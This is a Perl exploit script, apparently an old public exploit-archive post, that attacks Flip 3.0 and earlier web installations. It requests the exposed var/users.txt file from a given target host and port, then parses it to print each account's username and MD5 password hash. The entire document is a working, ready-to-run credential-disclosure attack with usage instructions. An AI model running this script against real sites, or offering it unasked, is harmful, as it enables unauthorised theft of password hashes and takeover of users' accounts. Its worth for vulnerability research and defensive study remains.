#!/usr/bin/perl

use strict; 
use IO::Socket;

my $app = "Flip <= 3.0";
my $type = "Passwords Hash Disclosure";
my $author = "undefined1_";
my $vendor = "http://sourceforge.net/projects/flipsource";

banner();
my $server = shift || usage();
my $port = shift || usage();

if($server =~ /http:\/\//)
{
	$server = substr($server,7);
}

my $path = "/";
if(index($server, "/") != -1)
{
	$path = substr($server, index($server, "/"));
	$server = substr($server, 0, index($server, "/"));
	if(substr($path, length($path)-1) ne "/") {
		$path .= "/";
	}
}

my $data = get($server, $port, $path."var/users.txt", "");
fail() unless $data !~ /404 Not Found/;
my $index1 = index($data, "\r\n\r\n");
fail() unless $index1 >= 0;

$data = substr($data, $index1+4);
$index1 = 0;
printf ("%-20s %-32s\n", "username", "md5 hash");
while(($index1 = index($data, "\n")) >= 0)
{	
	my $hash = substr($data, 0, 32);
	my $index2 = index($data, "][");
	my $index3 = index($data, "][", $index2+2);
	my $user = "";
	if($index2 >= 0 && $index3 >= 0)
	{
		$user = substr($data, $index2+2, $index3-($index2+2));
	}
	printf ("%-20s %-32s\n", $user, $hash);
	$data = substr($data, $index1+1);
}

###################

sub get(\$,\$,\$,\$) {
	my $server = shift;
	my $port = shift;
	my $page = shift;
	my $cookies = shift;
	my $query = "GET $page HTTP/1.1\r\n";
	if($port != 80)
	{
		$query .= "Host: $server:$port\r\n";
	}
	else
	{
		$query .= "Host: $server\r\n";
	}

	$query .= "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.0.2) Gecko/20060308 Firefox/1.5.0.2\r\n";
	$query .= "Connection: close\r\n";
	$query .= "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n";
	$query .= "Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3\r\n";
	$query .= "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n";	
	
	if(length($cookies))
	{
		$query .= "Cookie: ".$cookies."\r\n";
	}			

	$query .= "\r\n";
	return sendpacket($server, $port, $query);
}





sub sendpacket(\$,\$,\$) {
	my $server = shift;
	my $port = shift;
	my $query = shift;
	my $sock = IO::Socket::INET->new(Proto => "tcp", 
				PeerAddr => $server, PeerPort => $port) 
				or die "[-] Could not connect to $server:$port $!\n";
	print $sock $query;
	my $data = "";
	my $answer;
	while($answer = <$sock>)
	{
		$data .= $answer;
	}

	close($sock);
	return $data;
}



###################



sub fail() {
	print "[-] exploit failed\n";
	exit;
}



sub banner() {
	print ":: Flip <= 3.0 password hash disclosure exploit\n";
	print ":: by undefined1_ @ www.undef1.com\n\n\n";
}



sub usage() {
	print "usage  : ./flip_pass.pl <target> <port>\n";
	print "example: ./flip_pass.pl www.abcd.com/flip/ 80\n";
	exit;
}

# milw0rm.com [2007-09-20]